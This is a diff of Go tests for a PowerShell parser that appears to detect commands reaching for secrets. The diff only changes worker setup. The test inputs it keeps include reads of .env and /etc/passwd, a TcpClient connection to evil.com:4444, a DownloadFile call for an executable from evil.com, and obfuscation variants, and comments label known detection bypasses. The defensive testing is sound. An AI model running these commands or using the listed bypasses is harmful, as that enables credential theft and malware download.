@@ -339,16 +339,7 @@ func TestPSWorker_EvasionIntegrity(t *testing.T) {
 // TestPSWorker_Roundtrip verifies the low-level pwsh worker IPC: that parse()
 // returns structured commands with correct names and args.
 func TestPSWorker_Roundtrip(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	resp, err := w.parse(`Get-Content -Path "C:/secrets/.env"`)
 	if err != nil {
@@ -371,16 +362,7 @@ func TestPSWorker_Roundtrip(t *testing.T) {
 // TestPSWorker_VarResolution verifies that the pwsh worker resolves
 // $var = "value" assignments and substitutes them in subsequent commands.
 func TestPSWorker_VarResolution(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	resp, err := w.parse(`$target = "C:/Users/user/.env"; Get-Content $target`)
 	if err != nil {
@@ -407,15 +389,7 @@ func TestPSWorker_VarResolution(t *testing.T) {
 // TestPSWorker_ExpandableStringArg verifies that "$var" expandable string
 // arguments are resolved when the variable was assigned on the same scope level.
 func TestPSWorker_ExpandableStringArg(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		name     string
@@ -462,15 +436,7 @@ func TestPSWorker_ExpandableStringArg(t *testing.T) {
 // TestPSWorker_TypeCastAssignment verifies that [type]$var = "literal"
 // assignments are captured and resolved in subsequent commands.
 func TestPSWorker_TypeCastAssignment(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	resp, err := w.parse(`[string]$path = "/home/user/.env"; Get-Content $path`)
 	if err != nil {
@@ -493,15 +459,7 @@ func TestPSWorker_TypeCastAssignment(t *testing.T) {
 // TestPSWorker_HasSubstColonSyntax verifies that has_subst is set to true
 // when a parameter's colon-syntax value is a variable or expandable string.
 func TestPSWorker_HasSubstColonSyntax(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		name         string
@@ -547,15 +505,7 @@ func TestPSWorker_HasSubstColonSyntax(t *testing.T) {
 // TestPSWorker_ArrayLiteralArgs verifies that array literal arguments
 // @("a", "b") and comma-separated "a", "b" have their string elements extracted.
 func TestPSWorker_ArrayLiteralArgs(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		name     string
@@ -610,15 +560,7 @@ func TestPSWorker_ArrayLiteralArgs(t *testing.T) {
 // TestPSWorker_ScopePrefixVar verifies that scope-qualified variables
 // ($global:x, $script:x, $local:x) are resolved via their unqualified name.
 func TestPSWorker_ScopePrefixVar(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		name    string
@@ -674,15 +616,7 @@ func TestPSWorker_ScopePrefixVar(t *testing.T) {
 // ([Type]::Method(args)) are detected via InvokeMemberExpressionAst walking.
 // Previously a [GAP-SILENT] bypass; now [DETECTED].
 func TestPSWorker_DotNetMethodCall(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		cmd      string
@@ -736,15 +670,7 @@ func TestPSWorker_DotNetMethodCall(t *testing.T) {
 
 // TestPSWorker_AddType verifies that Add-Type with -Path is detected as OpExecute.
 func TestPSWorker_AddType(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		cmd     string
@@ -776,15 +702,7 @@ func TestPSWorker_AddType(t *testing.T) {
 // variable holds a known value are now resolved — previously a [GAP-SILENT] bypass,
 // now [DETECTED] via the variable command name resolution in Step 4.
 func TestPSWorker_VariableCmdName_Silent(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	resp, err := w.parse(`$cmd = "Get-Content"; & $cmd /etc/passwd`)
 	if err != nil {
@@ -808,15 +726,7 @@ func TestPSWorker_VariableCmdName_Silent(t *testing.T) {
 // TestPSWorker_ComputedCmdName_Silent documents that & (Get-Command X) Y
 // does not extract Y as a path — a [GAP-SILENT] bypass.
 func TestPSWorker_ComputedCmdName_Silent(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	resp, err := w.parse(`& (Get-Command Get-Content) /etc/passwd`)
 	if err != nil {
@@ -838,15 +748,7 @@ func TestPSWorker_ComputedCmdName_Silent(t *testing.T) {
 // (string concat, subexpressions) set has_subst=true but yield no extracted
 // path — a [GAP-PARTIAL] bypass.
 func TestPSWorker_ConcatArg_HasSubst(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		name string
@@ -899,15 +801,7 @@ func TestPSWorker_ConcatArg_HasSubst(t *testing.T) {
 // whose value is a plain literal with no $variables) is treated as a string
 // constant and the value is extracted as an argument.
 func TestPSWorker_LiteralExpandableString(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		name    string
@@ -954,15 +848,7 @@ func TestPSWorker_LiteralExpandableString(t *testing.T) {
 // TestPSWorker_PipelineInput verifies that string literals piped into a command
 // ("/path" | Get-Content) are collected as implicit positional args. [DETECTED]
 func TestPSWorker_PipelineInput(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		name    string
@@ -1054,15 +940,7 @@ func TestPSWorker_IEX_OpExecuteOnly(t *testing.T) {
 // and other loop scriptblocks ARE correctly extracted — FindAll($true) recurses
 // into nested scriptblock bodies. [DETECTED]
 func TestPSWorker_LoopBody_Detected(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		name     string
@@ -1113,15 +991,7 @@ func TestPSWorker_LoopBody_Detected(t *testing.T) {
 // command names are resolved by the PS lexer before crust sees the AST.
 // Backtick obfuscation is transparent to the worker. [DETECTED]
 func TestPSWorker_BacktickObfuscation_Detected(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	// Backtick inside a command name: Get`-Content = Get-Content
 	resp, err := w.parse("Get`-Content /etc/passwd")
@@ -1145,15 +1015,7 @@ func TestPSWorker_BacktickObfuscation_Detected(t *testing.T) {
 // This is Bug 11: previously HashtableAst assignments were ignored and @var
 // splatting yielded no extracted args.
 func TestPSWorker_Splatting(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		name     string
@@ -1209,15 +1071,7 @@ func TestPSWorker_Splatting(t *testing.T) {
 // nor CommandParameterAst, so the existing has_subst logic already catches it.
 // Bug 15 is correctly detected as uncertain — [GAP-PARTIAL].
 func TestPSWorker_PipelineLoopVar(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		name         string
@@ -1273,15 +1127,7 @@ func TestPSWorker_PipelineLoopVar(t *testing.T) {
 // TestPSWorker_InstanceMethodCall verifies that New-Object instance method calls
 // are detected via InvokeMemberExpressionAst walking. [DETECTED]
 func TestPSWorker_InstanceMethodCall(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		cmd      string
@@ -1335,15 +1181,7 @@ func TestPSWorker_InstanceMethodCall(t *testing.T) {
 // TestPSWorker_VarCommandName verifies that & $var commands are resolved when
 // the variable was assigned a string literal in the same scope. [DETECTED]
 func TestPSWorker_VarCommandName(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		cmd      string
@@ -1399,15 +1237,7 @@ func TestPSWorker_VarCommandName(t *testing.T) {
 // correctly by the pwsh worker. BUG 4: requires system.reflection.assembly::loadfrom
 // in the commandDB so OpExecute is produced downstream.
 func TestPSWorker_AssemblyLoad_UNCPath(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	// UNC path: the pwsh worker must preserve the leading \\ without mangling.
 	// requires BUG4 fix: system.reflection.assembly::loadfrom in commandDB.
@@ -1437,15 +1267,7 @@ func TestPSWorker_AssemblyLoad_UNCPath(t *testing.T) {
 // is extracted as "system.net.sockets.tcpclient::connect" with the hostname arg.
 // BUG 4: requires the commandDB entry for system.net.sockets.tcpclient::connect.
 func TestPSWorker_TcpClientConnect(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	// requires BUG4 fix: system.net.sockets.tcpclient::connect in commandDB
 	const script = `$tcp = New-Object System.Net.Sockets.TcpClient
@@ -1475,15 +1297,7 @@ $tcp.Connect("evil.com", 4444)`
 // is extracted as "microsoft.win32.registry::getvalue" with the registry path arg.
 // BUG 4: requires commandDB entry for microsoft.win32.registry::getvalue.
 func TestPSWorker_RegistryAccess(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	// requires BUG4 fix: microsoft.win32.registry::getvalue in commandDB
 	const script = `[Microsoft.Win32.Registry]::GetValue("HKEY_LOCAL_MACHINE\SOFTWARE", "key", $null)`
@@ -1523,15 +1337,7 @@ func TestPSWorker_RegistryAccess(t *testing.T) {
 //   - args should contain "/etc/passwd"
 //   - HasSubst should be false
 func TestPSWorker_StaticMethod_VarArg(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	const wantName = "system.io.file::readalltext"
 
@@ -1777,15 +1583,7 @@ func FuzzExtractor_PSCommand(f *testing.F) {
 //
 // BUG: fails before fix — add //nolint:unused if needed
 func TestPSWorker_NewObjectNamedTypeName(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	t.Run("variable form: $wc = New-Object -TypeName ... ; $wc.Method()", func(t *testing.T) {
 		// BUG: fails before fix — named -TypeName parameter not recognized by instance-method walker.
@@ -1849,15 +1647,7 @@ $wc.DownloadFile("http://evil.com/x.exe", "C:\tmp\x.exe")`
 // that the worker at least emits the correct command name so that any DB entry
 // added later will be matched.
 func TestPSWorker_AssemblyLoad(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	tests := []struct {
 		name     string
@@ -1916,15 +1706,7 @@ func TestPSWorker_AssemblyLoad(t *testing.T) {
 // never flagged as substituted. After the fix, has_subst must reflect whether
 // any argument is non-literal.
 func TestPSWorker_StaticMethod_HasSubst(t *testing.T) {
-	pwshPath, ok := FindPwsh()
-	if !ok {
-		t.Skip("pwsh.exe / powershell.exe not found")
-	}
-	w, err := newPwshWorker(pwshPath)
-	if err != nil {
-		t.Fatalf("newPwshWorker: %v", err)
-	}
-	defer w.stop()
+	w := getSharedPwshWorker(t)
 
 	t.Run("variable arg sets has_subst=true", func(t *testing.T) {
 		// BUG 10: fails before fix — has_subst was always false for static methods.
